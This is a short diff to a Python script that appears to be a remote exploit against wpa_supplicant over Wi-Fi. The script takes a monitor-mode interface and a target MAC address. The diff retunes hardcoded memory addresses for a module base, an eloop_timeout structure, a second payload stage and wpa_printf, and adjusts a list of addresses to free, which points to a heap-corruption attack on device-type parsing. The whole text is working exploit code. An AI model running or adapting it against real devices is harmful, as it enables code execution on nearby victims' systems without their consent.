@@ -20,16 +20,17 @@ args = parser.parse_args()
 iface = args.interface        # interface in monitor mode
 target = args.target          # target MAC address
 
-base  = 0x5575aa2000          # base address of main module
+base  = 0x5570271000         # base address of main module
 
 eloop = 0x7fb6e32780          # eloop_timeout address
-p2    = 0x7fb6e2d1a0          # second part of payload
+p2    = 0x7fb6e2f320          # second part of payload
 
 eloop_next = base + 0x1f0770  # eloop next (&list terminates)
 wpa_printf = base + 0x027d48  # addr of wpa_printf
 
 msg = b"hi :)"                # log on success (< 8 bytes)
 frees = [eloop-0x20]          # list of addrs to free (up to 10)
+# frees = []                    # list of addrs to free (up to 10)
 sec_devs = 0x12+len(frees)    # number of secondary device types
 
 p64 = lambda x: struct.pack("<Q", x)
